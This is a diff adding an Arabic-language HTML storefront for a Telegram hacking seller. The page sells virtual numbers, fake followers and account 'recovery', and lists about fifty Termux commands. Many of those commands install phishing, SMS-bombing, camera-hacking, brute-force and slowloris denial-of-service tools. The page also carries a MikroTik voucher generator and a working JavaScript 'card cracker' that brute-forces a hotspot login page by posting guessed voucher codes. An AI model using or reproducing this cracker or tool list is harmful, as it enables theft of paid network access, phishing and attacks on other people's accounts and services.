@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر 𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</title>
+    <style>
+        :root {
+            --bg: #05070a; --card: #0d1117; --blue: #24A1DE; 
+            --term-green: #39ff14; --purple: #8a2be2; --red: #ff4444;
+        }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: white; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
+        
+        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
+
+        header {
+            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://img.freepik.com/free-vector/cyber-security-concept_23-2148532223.jpg');
+            background-size: cover; padding: 40px 20px; text-align: center; border-bottom: 2px solid var(--blue);
+        }
+        .dev-name { color: var(--blue); font-size: 1.2rem; font-weight: bold; text-shadow: 0 0 10px var(--blue); }
+
+        nav { background: var(--card); padding: 15px; display: flex; justify-content: flex-start; gap: 8px; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #30363d; overflow-x: auto; scrollbar-width: none; }
+        nav::-webkit-scrollbar { display: none; }
+        nav button { background: #21262d; border: 1px solid #30363d; color: white; padding: 12px 18px; cursor: pointer; border-radius: 8px; white-space: nowrap; font-weight: bold; transition: 0.3s; }
+        nav button.active { background: var(--blue); border-color: var(--blue); box-shadow: 0 0 10px var(--blue); }
+
+        .container { max-width: 1200px; margin: auto; padding: 20px; }
+        .section { display: none; }
+        .section.active { display: block; animation: fadeIn 0.5s ease; }
+
+        .section-header { text-align: center; margin-bottom: 30px; }
+        .section-header img { width: 80px; height: 80px; border-radius: 15px; border: 2px solid var(--blue); padding: 5px; background: #161b22; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; }
+        .card { background: var(--card); border: 1px solid #30363d; border-radius: 15px; padding: 20px; text-align: center; transition: 0.3s; position: relative; overflow: hidden; }
+        .card:hover { transform: translateY(-5px); border-color: var(--blue); }
+        
+        .price { font-size: 1.5rem; color: var(--term-green); font-weight: bold; margin: 15px 0; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; box-sizing: border-box; transition: 0.2s; }
+        .btn-tele { background: var(--blue); color: white; }
+        .btn-free { background: transparent; border: 1px solid var(--term-green); color: var(--term-green); }
+
+        .tool-box { background: rgba(13, 17, 23, 0.9); border: 1px solid var(--blue); border-radius: 15px; padding: 25px; max-width: 700px; margin: 0 auto; }
+        textarea, input { background: #000; color: var(--term-green); border: 1px solid #30363d; padding: 12px; margin: 10px 0; width: 100%; border-radius: 8px; box-sizing: border-box; font-family: monospace; }
+        #log, #result-gen { background: #000; color: var(--term-green); border: 1px dotted var(--term-green); padding: 15px; max-height: 250px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; text-align: left; direction: ltr; border-radius: 8px; }
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; }
+        .modal-content { background: #000; border: 1px solid var(--blue); padding: 30px; width: 90%; max-width: 500px; border-radius: 15px; position: relative; text-align: center; }
+        code { background: #111; color: var(--term-green); padding: 15px; display: block; direction: ltr; text-align: left; border-radius: 5px; margin-top: 15px; border-left: 4px solid var(--term-green); white-space: pre-wrap; font-family: monospace; }
+
+        footer { text-align: center; padding: 30px; background: var(--card); border-top: 1px solid #333; margin-top: 50px; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<canvas id="matrixCanvas"></canvas>
+
+<header>
+    <div class="dev-name">𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</div>
+    <h1>مـتـجـر مكافحة الفساد الـتـقـنـي 🌐</h1>
+</header>
+
+<nav>
+    <button onclick="showSec('nums')" id="b-nums" class="active">أرقام 📱</button>
+    <button onclick="showSec('soc')" id="b-soc">سوشيال 📈</button>
+    <button onclick="showSec('termux')" id="b-termux">تريمكس (50) 📟</button>
+    <button onclick="showSec('kali')" id="b-kali">كالي لينكس 🐉</button>
+    <button onclick="showSec('anti')" id="b-anti">مكافحة الابتزاز 🛡️</button>
+    <button onclick="showSec('courses')" id="b-courses">كورسات 📚</button>
+    <button onclick="showSec('gen')" id="b-gen">توليد كروت ⚡</button>
+    <button onclick="showSec('cracker')" id="b-cracker">تخمين كروت 🏴‍☠️</button>
+    <button onclick="showSec('hack')" id="b-hack">استرجاع 🛡️</button>
+    <button onclick="showSec('web')" id="b-web">مواقع 🌐</button>
+</nav>
+
+<div class="container">
+    <div id="nums" class="section active">
+        <div class="section-header"><h2>الأرقام الوهمية الدولية</h2></div>
+        <div class="grid" id="grid-nums"></div>
+    </div>
+
+    <div id="soc" class="section">
+        <div class="section-header"><h2>خدمات رشق المتابعين</h2></div>
+        <div class="grid" id="grid-soc"></div>
+    </div>
+
+    <div id="termux" class="section">
+        <div class="section-header"><h2 style="color:var(--term-green)">مكتبة أوامر Termux المتقدمة</h2></div>
+        <div class="grid" id="grid-term"></div>
+    </div>
+
+    <div id="kali" class="section">
+        <div class="section-header"><h2 style="color:var(--blue)">قسم كالي لينكس Kali Linux</h2></div>
+        <div class="card" style="max-width: 800px; margin: auto;">
+            <h3>كيفية تحميل وتثبيت كالي</h3>
+            <p>1. قم بتحميل نسخة ISO من الموقع الرسمي Kali.org.</p>
+            <p>2. استخدم برنامج Rufus لحرق النسخة على USB.</p>
+            <p>3. ابدأ الإقلاع واتبع خطوات التثبيت الرسومية.</p>
+            <a href="https://www.kali.org/get-kali/" class="btn btn-tele" style="margin-bottom:10px">الموقع الرسمي للتحميل</a>
+            <div class="grid" id="grid-kali-tools"></div>
+        </div>
+    </div>
+
+    <div id="anti" class="section">
+        <div class="section-header"><h2 style="color:var(--red)">خدمات مكافحة الابتزاز</h2></div>
+        <div class="grid" id="grid-anti">
+            <div class="card"><h3>إغلاق الحسابات المسيئة</h3><div class="price">تواصل للتقييم</div><button class="btn btn-tele" onclick="openOrder('إغلاق حسابات الابتزاز', 'تواصل')">طلب مساعدة 🚨</button></div>
+            <div class="card"><h3>تأمين الحسابات بالكامل</h3><div class="price">50 ر.س</div><button class="btn btn-tele" onclick="openOrder('تأمين الحسابات', '50 ر.س')">اطلب الآن</button></div>
+        </div>
+    </div>
+
+    <div id="courses" class="section">
+        <div class="section-header"><h2 style="color:var(--purple)">كورسات تعليمية</h2></div>
+        <div class="grid" id="grid-courses">
+            <div class="card"><h3>كورس الهكر الأخلاقي</h3><div class="price">مجاني 🎁</div><button class="btn btn-free" onclick="location.href='https://t.me/+Tgvx87dy1OQ1MTdk'">مشاهدة مجانية</button></div>
+            <div class="card"><h3>كورس اختبار اختراق المواقع</h3><div class="price">100 ر.س</div><button class="btn btn-tele" onclick="openOrder('كورس اختراق المواقع', '100 ر.س')">شراء الكورس</button></div>
+        </div>
+    </div>
+
+    <div id="gen" class="section">
+        <div class="tool-box" style="border-color: var(--term-green);">
+            <h2>توليد كروت مايكروتيك ⚡</h2>
+            <p>تطوير: 𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</p>
+            <input id="prefix" placeholder="الرقم الثابت (مثال: 61)">
+            <input id="totalLength" type="number" placeholder="إجمالي عدد الخانات (مثال: 10)">
+            <input id="amount" type="number" placeholder="الكمية المطلوبة">
+            <button class="btn btn-tele" style="background:var(--term-green); color:black;" onclick="generateCards()">توليد الكروت</button>
+            <button class="btn btn-free" style="margin-top:10px" onclick="copyCards()">نسخ النتائج</button>
+            <div id="result-gen" style="margin-top:15px">النتائج ستظهر هنا...</div>
+        </div>
+    </div>
+
+    <div id="cracker" class="section">
+        <div class="tool-box" style="border-color: var(--red);">
+            <h2>Mikrotik Card Cracker ☠</h2>
+            <p style="color:var(--red)">تطوير: 𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</p>
+            <input id="url" placeholder="رابط تسجيل الدخول (http://10.5.50.1/login)">
+            <textarea id="passwords" rows="5" placeholder="قائمة الكروت للتخمين (كل كرت في سطر)"></textarea>
+            <button class="btn btn-tele" style="background:var(--red)" onclick="startCracking()">ابدأ التخمين</button>
+            <div id="log" style="margin-top:15px; border-color:var(--red)">السجل: بانتظار البدء...</div>
+        </div>
+    </div>
+
+    <div id="hack" class="section">
+        <div class="section-header"><h2>خدمات الاسترجاع والحماية</h2></div>
+        <div class="grid" id="grid-hack"></div>
+    </div>
+
+    <div id="web" class="section">
+        <div class="section-header"><h2>إنشاء وبرمجة المواقع</h2></div>
+        <div class="grid" id="grid-web"></div>
+    </div>
+</div>
+
+<div id="mainModal" class="modal">
+    <div class="modal-content">
+        <span onclick="closeModal()" style="position:absolute; top:10px; left:15px; cursor:pointer; font-size:2rem;">&times;</span>
+        <h3 id="modal-title" style="color:var(--blue)"></h3>
+        <div id="modal-body"></div>
+    </div>
+</div>
+
+<footer>
+    <p>بواسطة المطور: <br> <span class="dev-name">𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</span></p>
+    <p><a href="https://t.me/VIP_HK3" style="color:var(--blue); text-decoration:none;">حسابي: @VIP_HK3</a> | <a href="https://t.me/+Tgvx87dy1OQ1MTdk" style="color:var(--blue); text-decoration:none;">قناتي</a></p>
+</footer>
+
+<script>
+    const canvas = document.getElementById("matrixCanvas");
+    const ctx = canvas.getContext("2d");
+    canvas.height = window.innerHeight; canvas.width = window.innerWidth;
+    const letters = "010101101011100110100001101";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = Array.from({ length: columns }, () => 1);
+    function drawMatrix() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters[Math.floor(Math.random() * letters.length)];
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(drawMatrix, 33);
+
+    const TELEGRAM_URL = "https://t.me/VIP_HK3";
+
+    function showSec(id) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.getElementById('b-'+id).classList.add('active');
+    }
+
+    function closeModal() { document.getElementById('mainModal').style.display = 'none'; }
+
+    function openOrder(name, price) {
+        document.getElementById('modal-title').innerText = "تأكيد الطلب";
+        document.getElementById('modal-body').innerHTML = `
+            <p>الخدمة: ${name}</p>
+            <p class="price">${price}</p>
+            <p>الحقوق: 𓆩•|ــ❪ᯓ𝐀𝐒𝐓O𝐑𝐓𝐀L𝐑𝐀𝐏❫ــ|•𓆪</p>
+            <a href="${TELEGRAM_URL}" class="btn btn-tele">تواصل مع المطور الآن</a>
+        `;
+        document.getElementById('mainModal').style.display = 'flex';
+    }
+
+    function openTermux(title, code) {
+        document.getElementById('modal-title').innerText = title;
+        document.getElementById('modal-body').innerHTML = `
+            <code>${code}</code>
+            <button class="btn btn-free" style="margin-top:10px" onclick="navigator.clipboard.writeText('${code}'); alert('تم النسخ!')">نسخ الأوامر</button>
+        `;
+        document.getElementById('mainModal').style.display = 'flex';
+    }
+
+    // الأرقام
+    const countries = ["أمريكا 🇺🇸", "بريطانيا 🇬🇧", "السعودية 🇸🇦", "تركيا 🇹🇷", "كندا 🇨🇦", "روسيا 🇷🇺", "فرنسا 🇫🇷", "ألمانيا 🇩🇪"];
+    for(let i=1; i<=12; i++) {
+        let c = countries[i % countries.length];
+        document.getElementById('grid-nums').innerHTML += `<div class="card"><h3>رقم ${c}</h3><div class="price">${15+i} ر.س</div><button class="btn btn-tele" onclick="openOrder('رقم ${c}', '${15+i} ر.س')">اطلب الآن</button></div>`;
+    }
+
+    // السوشيال
+    const plats = ["انستقرام", "تيك توك", "سناب", "تويتر"];
+    plats.forEach(p => {
+        [1000, 5000].forEach(q => {
+            document.getElementById('grid-soc').innerHTML += `<div class="card"><h3>${q} متابع ${p}</h3><div class="price">${q/100} ر.س</div><button class="btn btn-tele" onclick="openOrder('${q} متابع ${p}', '${q/100} ر.س')">طلب الآن</button></div>`;
+        });
+    });
+
+    // تريمكس 50 أمر
+    const tools = [
+        {n: "تحديث النظام", c: "pkg update && pkg upgrade"},
+        {n: "تثبيت بايثون", c: "pkg install python -y"},
+        {n: "تثبيت Git", c: "pkg install git -y"},
+        {n: "أداة ZPhisher", c: "git clone https://github.com/htr-tech/zphisher"},
+        {n: "أداة Metasploit", c: "pkg install metasploit"},
+        {n: "أداة Nmap", c: "pkg install nmap -y"},
+        {n: "أداة SQLmap", c: "pkg install sqlmap"},
+        {n: "تثبيت PHP", c: "pkg install php -y"},
+        {n: "تثبيت Nano", c: "pkg install nano -y"},
+        {n: "أداة IP-Tracer", c: "git clone https://github.com/rajkumardusad/IP-Tracer"},
+        {n: "أداة Cam-Hackers", c: "git clone https://github.com/AngelSecurityTeam/Cam-Hackers"},
+        {n: "أداة TBomb", c: "git clone https://github.com/TheSpeedX/TBomb"},
+        {n: "تثبيت Nodejs", c: "pkg install nodejs -y"},
+        {n: "تثبيت Java", c: "pkg install openjdk-17"},
+        {n: "أداة Tool-X", c: "git clone https://github.com/Rajkumardusad/Tool-X"},
+        {n: "تثبيت Curl", c: "pkg install curl -y"},
+        {n: "تثبيت Wget", c: "pkg install wget -y"},
+        {n: "أداة Red_Hawk", c: "git clone https://github.com/Tuhinshubhra/RED_HAWK"},
+        {n: "أداة HiddenEye", c: "git clone https://github.com/DarkSecDevelopers/HiddenEye"},
+        {n: "تثبيت Unzip", c: "pkg install unzip -y"},
+        {n: "أداة Sherlock", c: "git clone https://github.com/sherlock-project/sherlock"},
+        {n: "تثبيت Ruby", c: "pkg install ruby -y"},
+        {n: "أداة DarkFly", c: "git clone https://github.com/Ranginang67/DarkFly-Tool"},
+        {n: "تثبيت Figlet", c: "pkg install figlet -y"},
+        {n: "أداة Weeman", c: "git clone https://github.com/evait-security/weeman"},
+        {n: "أداة Ngrok", c: "git clone https://github.com/tchelospy/termux-ngrok"},
+        {n: "أداة AdminPanel", c: "git clone https://github.com/the-c0d3r/admin-panel-finder"},
+        {n: "تثبيت OpenSSH", c: "pkg install openssh -y"},
+        {n: "أداة Black-Hydra", c: "git clone https://github.com/Gameye98/Black-Hydra"},
+        {n: "تثبيت Clang", c: "pkg install clang -y"},
+        {n: "تثبيت Vim", c: "pkg install vim -y"},
+        {n: "تثبيت Tor", c: "pkg install tor -y"},
+        {n: "أداة Hash-Buster", c: "git clone https://github.com/s0md3v/Hash-Buster"},
+        {n: "تثبيت W3m", c: "pkg install w3m -y"},
+        {n: "أداة Netcat", c: "pkg install netcat -y"},
+        {n: "أداة Nikto", c: "pkg install nikto -y"},
+        {n: "تثبيت Zip", c: "pkg install zip -y"},
+        {n: "تثبيت Lscpu", c: "pkg install lscpu -y"},
+        {n: "أداة WebSploit", c: "pip install websploit"},
+        {n: "أداة Seekers", c: "git clone https://github.com/thewhiteh4t/seeker"},
+        {n: "تثبيت بايثون 2", c: "pkg install python2 -y"},
+        {n: "تحميل يوتيوب", c: "pip install youtube-dl"},
+        {n: "أداة Scan-Vuln", c: "git clone https://github.com/m4ll0k/Infoga"},
+        {n: "أداة Brute-Force", c: "git clone https://github.com/Mebis-Surya/Check-Virus"},
+        {n: "تثبيت Perl", c: "pkg install perl -y"},
+        {n: "أداة Slowloris", c: "git clone https://github.com/gkbrk/slowloris"},
+        {n: "أداة Recon-dog", c: "git clone https://github.com/s0md3v/ReconDog"},
+        {n: "أداة Shell-Phish", c: "git clone https://github.com/thelinuxchoice/shellphish"},
+        {n: "تغيير الواجهة", c: "pkg install cmatrix -y"},
+        {n: "إعادة التشغيل", c: "exit"}
+    ];
+    tools.forEach(t => {
+        document.getElementById('grid-term').innerHTML += `<div class="card" style="border-color:var(--term-green)"><h3>${t.n}</h3><button class="btn btn-free" onclick="openTermux('${t.n}', '${t.c}')">عرض الأوامر</button></div>`;
+    });
+
+    // كالي
+    ["فحص Nmap", "استغلال ثغرات", "تحليل شبكات"].forEach(k => {
+        document.getElementById('grid-kali-tools').innerHTML += `<div class="card"><h3>${k}</h3><button class="btn btn-free" onclick="openOrder('${k}', 'مجاني مع النظام')">تفاصيل</button></div>`;
+    });
+
+    // استرجاع
+    ["استرجاع إنستا", "فك حظر واتساب", "حماية"].forEach((s, i) => {
+        document.getElementById('grid-hack').innerHTML += `<div class="card"><h3>${s}</h3><div class="price">${150+(i*50)} ر.س</div><button class="btn btn-tele" onclick="openOrder('${s}', '${150+(i*50)} ر.س')">اطلب الآن</button></div>`;
+    });
+
+    // مواقع
+    ["متجر إلكتروني", "موقع تعريفي"].forEach(s => {
+        document.getElementById('grid-web').innerHTML += `<div class="card" style="border-color:var(--purple)"><h3>${s}</h3><div class="price">تبدأ من 400 ر.س</div><button class="btn btn-tele" style="background:var(--purple)" onclick="openOrder('${s}', 'تواصل للتفاصيل')">اطلب الآن</button></div>`;
+    });
+
+    function generateCards() {
+        const prefix = document.getElementById("prefix").value;
+        const total = parseInt(document.getElementById("totalLength").value);
+        const amt = parseInt(document.getElementById("amount").value);
+        if(!prefix || isNaN(total) || isNaN(amt)) return alert("أكمل البيانات");
+        let out = "";
+        for(let i=0; i<amt; i++) {
+            let r = prefix;
+            while(r.length < total) r += Math.floor(Math.random()*10);
+            out += r + "\n";
+        }
+        document.getElementById("result-gen").innerText = out;
+    }
+    function copyCards() { navigator.clipboard.writeText(document.getElementById("result-gen").innerText); alert("تم النسخ!"); }
+
+    async function startCracking() {
+        const url = document.getElementById("url").value;
+        const passwords = document.getElementById("passwords").value.trim().split("\n").filter(p => p);
+        const logDiv = document.getElementById("log");
+        if(!url || passwords.length === 0) return alert("أدخل البيانات");
+        logDiv.innerText = "[*] بدأت العملية لـ 『ASTORTALRAP』...";
+        for (let pass of passwords) {
+            logDiv.innerText += `\n[*] تجربة: ${pass}`;
+            try {
+                const res = await fetch(url, {
+                    method: "POST",
+                    body: `username=${pass}&password=${pass}`,
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+                });
+                const text = await res.text();
+                if (text.includes("logout") || !text.includes("invalid")) {
+                    logDiv.innerText += `\n[+] تم بنجاح: ${pass}`;
+                    alert("وجدنا كرت شغال: " + pass); break;
+                }
+            } catch (e) { logDiv.innerText += `\n[!] خطأ في الاتصال`; }
+        }
+    }
+</script>
+
+</body>
+</html>
